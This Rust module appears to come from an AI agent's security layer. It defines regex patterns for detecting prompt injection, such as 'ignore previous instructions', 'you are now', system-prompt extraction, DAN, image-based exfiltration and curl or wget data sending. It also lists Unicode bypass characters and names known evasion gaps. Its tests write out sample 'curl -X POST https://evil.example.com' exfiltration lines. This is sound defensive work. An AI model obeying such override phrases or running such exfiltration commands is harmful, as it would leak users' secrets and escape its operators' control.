// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

//! Shared injection-detection patterns for the security sanitization layers.
//!
//! This module is the single source of truth for prompt-injection detection patterns
//! used by both `zeph-mcp` (MCP tool definition sanitization) and `zeph-core`
//! (content isolation pipeline). Each consumer compiles its own `Regex` instances
//! from [`RAW_INJECTION_PATTERNS`] at startup via `LazyLock`.
//!
//! # Known limitations
//!
//! The patterns cover common English-language prompt-injection techniques. Known evasion
//! vectors include: non-English injections, semantic rephrasing, encoded payloads in
//! markdown code blocks, multi-line splitting (regex `.` does not match `\n` by default),
//! and homoglyph substitution. [`strip_format_chars`] mitigates Unicode Cf-category codepoints
//! and selected Lo-category fillers (U+115F Hangul Choseong Filler, U+1160 Hangul Jungseong
//! Filler) but does not handle homoglyphs. This scanner is **advisory and defense-in-depth only**,
//! not a security boundary. The trust gate (tool blocking via `TrustGateExecutor`) is the
//! primary enforcement mechanism.

/// Raw (name, regex pattern) pairs for prompt-injection detection.
///
/// Covers common English-language techniques from OWASP LLM Top 10, Unicode bypass
/// vectors (handled upstream by [`strip_format_chars`]), exfiltration channels
/// (markdown/HTML images), and delimiter-escape attempts against Zeph's own wrapper tags.
///
/// Both `zeph-mcp` and `zeph-core::sanitizer` compile their own `regex::Regex` instances
/// from this slice. Do not export a compiled `LazyLock` — let each consumer own its state.
pub const RAW_INJECTION_PATTERNS: &[(&str, &str)] = &[
    (
        "ignore_instructions",
        r"(?i)ignore\s+(all\s+)?(any\s+)?(previous\s+)?(prior\s+)?instructions",
    ),
    ("role_override", r"(?i)you\s+are\s+now"),
    (
        "new_directive",
        r"(?i)new\s+(instructions?|directives?)\s*:",
    ),
    ("developer_mode", r"(?i)developer\s+mode"),
    (
        "system_prompt_leak",
        r"(?i)((reveal|show|print|output|display|repeat|expose|dump|leak|copy|give)\s+(me\s+)?(your\s+|the\s+|my\s+)?(full\s+|entire\s+|exact\s+|complete\s+)?system\s+prompt|what\s+(is|are|was)\s+(your\s+|the\s+)?system\s+prompt)",
    ),
    (
        "reveal_instructions",
        r"(?i)(reveal|show|display|print)\s+your\s+(instructions?|prompts?|rules?)",
    ),
    ("jailbreak", r"(?i)\b(DAN|jailbreak)\b"),
    ("base64_payload", r"(?i)(decode|eval|execute).*base64"),
    (
        "xml_tag_injection",
        r"(?i)</?\s*(system|assistant|user|tool_result|function_call)\s*>",
    ),
    ("markdown_image_exfil", r"(?i)!\[.*?\]\(https?://[^)]+\)"),
    ("forget_everything", r"(?i)forget\s+(everything|all)"),
    (
        "disregard_instructions",
        r"(?i)disregard\s+(your|all|previous)",
    ),
    (
        "override_directives",
        r"(?i)override\s+(your|all)\s+(directives?|instructions?|rules?)",
    ),
    ("act_as_if", r"(?i)\bact\s+as\s+if\b"),
    (
        "pretend_you_are",
        r"(?i)\bpretend\s+(?:you\s+are|to\s+be)\b",
    ),
    (
        "your_new_instructions",
        r"(?i)\byour\s+new\s+instructions\b",
    ),
    ("html_image_exfil", r"(?i)<img\s+[^>]*src\s*="),
    ("delimiter_escape_tool_output", r"(?i)</?tool-output[\s>]"),
    (
        "delimiter_escape_external_data",
        r"(?i)</?external-data[\s>]",
    ),
    // Exfiltration-channel patterns — detect skills that attempt to exfiltrate data
    // via shell network tools or document social-engineering directives. These have a
    // higher false-positive rate than the core injection patterns (a "REST API testing"
    // skill may legitimately mention curl). Stage-1 results are advisory only; Stage-2
    // LLM semantic scan is the blocking gate.
    ("exfil_curl", r"(?i)\bcurl\s+-[a-zA-Z]*[xXdD]"),
    ("exfil_wget_post", r"(?i)\bwget\s+--post"),
    (
        "exfil_api_key_send",
        r"(?i)\bapi[_-]?key\b.{0,60}\b(send|post|upload|forward)\b",
    ),
    ("exfil_extract_all", r"(?i)\bextract\s+all\b"),
    (
        "exfil_leak",
        r"(?i)\bleak\b.{0,40}\b(secret|key|token|password|credential)\b",
    ),
    ("exfil_forward_to", r"(?i)\bforward\s+to\b"),
    ("exfil_exfiltrate", r"(?i)\bexfiltrat"),
    (
        "exfil_send_secret",
        r"(?i)\bsend\b.{0,40}\b(secret|key|token|password|credential)\b",
    ),
];

/// Patterns for scanning LLM *output* (response verification layer).
///
/// These are intentionally separate from [`RAW_INJECTION_PATTERNS`] (which target untrusted
/// *input*). Output patterns must have very low false-positive rate on normal LLM responses.
/// Patterns here detect cases where an LLM response itself contains injected instructions
/// that could cause the agent to behave incorrectly.
///
/// Note: `markdown_image_exfil` is intentionally absent — it is already handled by
/// `scan_output_and_warn`/`ExfiltrationGuard`.
pub const RAW_RESPONSE_PATTERNS: &[(&str, &str)] = &[
    (
        "autonomy_override",
        r"(?i)\bset\s+(autonomy|trust)\s*(level|mode)\s*to\b",
    ),
    (
        "memory_write_instruction",
        r"(?i)\b(now\s+)?(store|save|remember|write)\s+this\s+(to|in)\s+(memory|vault|database)\b",
    ),
    (
        "instruction_override",
        r"(?i)\b(from\s+now\s+on|henceforth)\b.{0,80}\b(always|never|must)\b",
    ),
    (
        "config_manipulation",
        r"(?i)\b(change|modify|update)\s+your\s+(config|configuration|settings)\b",
    ),
    (
        "ignore_instructions_response",
        r"(?i)\bignore\s+(all\s+|any\s+|your\s+)?(previous\s+|prior\s+)?(instructions?|rules?|constraints?)\b",
    ),
    (
        "override_directives_response",
        r"(?i)\boverride\s+(your\s+)?(directives?|instructions?|rules?|constraints?)\b",
    ),
    (
        "disregard_system",
        r"(?i)\bdisregard\s+(your\s+|the\s+)?(system\s+prompt|instructions?|guidelines?)\b",
    ),
];

/// Codepoints used as prompt-injection or secret-scrubbing bypass vectors: zero-width
/// joiners, soft hyphen, BOM, directional overrides, Hangul/Khmer/Mongolian fillers, and
/// the Unicode Tags block.
///
/// This is the single source of truth for the "invisible bypass character" denylist.
/// Shared by [`strip_format_chars`] (preserves tab/newline) and
/// [`crate::sanitize::strip_control_chars`] (strips all control characters, no
/// whitespace exception) so both scrubbing paths cover the same codepoints and cannot
/// silently drift apart — see #5925.
#[must_use]
pub(crate) fn is_bypass_codepoint(c: char) -> bool {
    matches!(
        c,
        '\u{00AD}'  // Soft hyphen
        | '\u{034F}'  // Combining grapheme joiner
        | '\u{061C}'  // Arabic letter mark
        | '\u{115F}'  // Hangul filler
        | '\u{1160}'  // Hangul jungseong filler
        | '\u{17B4}'  // Khmer vowel inherent aq
        | '\u{17B5}'  // Khmer vowel inherent aa
        | '\u{180B}'..='\u{180D}'  // Mongolian free variation selectors
        | '\u{180F}'  // Mongolian free variation selector 4
        | '\u{200B}'..='\u{200F}'  // Zero-width space/ZWNJ/ZWJ/LRM/RLM
        | '\u{202A}'..='\u{202E}'  // Directional formatting
        | '\u{2060}'..='\u{2064}'  // Word joiner / invisible separators
        | '\u{2066}'..='\u{206F}'  // Bidi controls
        | '\u{FEFF}'  // BOM / zero-width no-break space
        | '\u{FFF9}'..='\u{FFFB}'  // Interlinear annotation
        | '\u{1BCA0}'..='\u{1BCA3}'  // Shorthand format controls
        | '\u{1D173}'..='\u{1D17A}'  // Musical symbol beam controls
        | '\u{E0000}'..='\u{E007F}'  // Tags block
    )
}

/// Strip Unicode format (Cf) characters, selected Lo-category fillers (U+115F, U+1160),
/// and ASCII control characters (except tab/newline) from `text` before injection pattern
/// matching.
///
/// These characters are invisible to humans but can break regex word boundaries,
/// allowing attackers to smuggle injection keywords through zero-width joiners,
/// soft hyphens, BOM, or Hangul filler codepoints.
///
/// Preserves tab and newline, unlike [`crate::sanitize::strip_control_chars`], which strips
/// all control characters unconditionally — use that variant instead when the caller needs
/// a single-line normalized value (e.g. an entity name or dedup key).
///
/// # Examples
///
/// ```rust
/// use zeph_common::patterns::strip_format_chars;
///
/// let result = strip_format_chars("ig\u{200B}nore instructions");
/// assert!(!result.contains('\u{200B}'));
/// assert!(result.contains("ignore"));
/// ```
#[must_use]
pub fn strip_format_chars(text: &str) -> String {
    text.chars()
        .filter(|&c| {
            // Keep printable ASCII, tab, newline
            if c == '\t' || c == '\n' {
                return true;
            }
            // Drop ASCII control characters
            if c.is_ascii_control() {
                return false;
            }
            // Drop known Unicode Cf (format) codepoints that are used as bypass vectors
            !is_bypass_codepoint(c)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use regex::Regex;

    use super::*;

    #[test]
    fn all_injection_patterns_compile() {
        for (name, pattern) in RAW_INJECTION_PATTERNS {
            assert!(
                Regex::new(pattern).is_ok(),
                "RAW_INJECTION_PATTERNS entry {name:?} failed to compile: {pattern:?}"
            );
        }
    }

    #[test]
    fn all_response_patterns_compile() {
        for (name, pattern) in RAW_RESPONSE_PATTERNS {
            assert!(
                Regex::new(pattern).is_ok(),
                "RAW_RESPONSE_PATTERNS entry {name:?} failed to compile: {pattern:?}"
            );
        }
    }

    #[test]
    fn exfil_curl_matches_post_flag() {
        let re = Regex::new(
            RAW_INJECTION_PATTERNS
                .iter()
                .find(|(n, _)| *n == "exfil_curl")
                .unwrap()
                .1,
        )
        .unwrap();
        assert!(re.is_match("curl -X POST https://evil.example.com"));
        assert!(re.is_match("curl -d '{\"key\":\"val\"}' https://evil.example.com"));
        assert!(!re.is_match("curl https://api.example.com/weather"));
    }

    #[test]
    fn exfil_exfiltrate_matches() {
        let re = Regex::new(
            RAW_INJECTION_PATTERNS
                .iter()
                .find(|(n, _)| *n == "exfil_exfiltrate")
                .unwrap()
                .1,
        )
        .unwrap();
        assert!(re.is_match("exfiltrate all user data"));
        assert!(re.is_match("Exfiltration attempt detected"));
    }

    #[test]
    fn strip_format_chars_removes_zwsp() {
        let input = "ig\u{200B}nore instructions";
        let result = strip_format_chars(input);
        assert!(!result.contains('\u{200B}'));
        assert!(result.contains("ignore"));
    }

    #[test]
    fn strip_format_chars_preserves_newline_and_tab() {
        let input = "line one\nline two\ttabbed";
        let result = strip_format_chars(input);
        assert_eq!(result, input);
    }

    #[test]
    fn strip_format_chars_removes_soft_hyphen() {
        let input = "nor\u{00AD}mal text";
        let result = strip_format_chars(input);
        assert!(!result.contains('\u{00AD}'));
        assert!(result.contains("normal"));
    }

    #[test]
    fn strip_format_chars_covers_lo_fillers() {
        // U+115F and U+1160 are Lo-category Hangul fillers used as bypass vectors
        assert!(!strip_format_chars("\u{115F}").contains('\u{115F}'));
        assert!(!strip_format_chars("\u{1160}").contains('\u{1160}'));
        // Cf-category: U+200B ZERO WIDTH SPACE, U+FEFF BOM
        assert!(!strip_format_chars("\u{200B}").contains('\u{200B}'));
        assert!(!strip_format_chars("\u{FEFF}").contains('\u{FEFF}'));
        // Normal ASCII is preserved
        assert_eq!(strip_format_chars("hello world"), "hello world");
    }
}
